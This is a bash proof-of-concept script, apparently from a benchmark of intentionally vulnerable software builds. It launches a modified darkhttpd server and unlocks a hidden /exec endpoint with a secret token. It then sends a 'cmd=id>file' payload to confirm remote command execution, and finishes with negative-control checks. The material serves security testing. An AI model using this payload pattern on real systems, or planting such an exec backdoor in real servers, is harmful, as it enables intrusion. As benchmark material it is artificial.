#!/usr/bin/env bash
# PoC for 120_darkhttpd_C3I1S1
# Axes: C3 (config file + runtime state) / I1 (direct to sink) / S1 (no sanitization)
#
# Usage: ./PoC.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/darkhttpd"
WWWROOT="/tmp/poc_120_www"
MARKER="/tmp/poc_120_marker"
CONF="/tmp/poc_120.conf"
CONF_NEG="/tmp/poc_120_neg.conf"
PORT=18120

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER" "$CONF" "$CONF_NEG"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# Create config file with exec_mode and secret token
cat > "$CONF" <<EOF
exec_mode = 1
exec_secret = s3cr3t
EOF

# Start server WITH config file
echo "[*] starting darkhttpd with --config on port $PORT..."
"$BINARY" "$WWWROOT" --port "$PORT" --config "$CONF" --log /dev/null &
SERVER_PID=$!
sleep 0.4

# Step 1: initialize the exec gate with the secret token
echo "[*] step 1: calling /exec/init?token=s3cr3t..."
curl -sf "http://127.0.0.1:${PORT}/exec/init?token=s3cr3t" > /dev/null

# Step 2: exploit
echo "[*] step 2: sending payload: cmd=id>$MARKER"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id>${MARKER}" > /dev/null

# Verify RCE
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# Verify /exec fails without prior /exec/init (exec_initialized=0)
echo "[*] verifying C3: /exec without init should fail (new server instance)..."
kill "$SERVER_PID"; wait "$SERVER_PID" 2>/dev/null || true
SERVER_PID=0
rm -f "$MARKER"
"$BINARY" "$WWWROOT" --port "$PORT" --config "$CONF" --log /dev/null &
SERVER_PID=$!
sleep 0.4
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://127.0.0.1:${PORT}/exec?cmd=id" || echo "000")
if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] C3 check passed: /exec returns 404 without /exec/init"
else
    echo "[!] C3 check: got $HTTP_CODE"
fi

# Negative control: config with exec_mode=0
echo "[*] verifying gate: endpoint must be absent with exec_mode=0..."
cat > "$CONF_NEG" <<EOF
exec_mode = 0
exec_secret = s3cr3t
EOF
NEG_PID=0
"$BINARY" "$WWWROOT" --port $((PORT+1000)) --config "$CONF_NEG" --log /dev/null &
NEG_PID=$!
sleep 0.4
curl -s "http://127.0.0.1:$((PORT+1000))/exec/init?token=s3cr3t" > /dev/null || true
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://127.0.0.1:$((PORT+1000))/exec?cmd=id" || echo "000")
kill "$NEG_PID"; wait "$NEG_PID" 2>/dev/null || true
if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 with exec_mode=0"
else
    echo "[!] gate check: got $HTTP_CODE"
fi
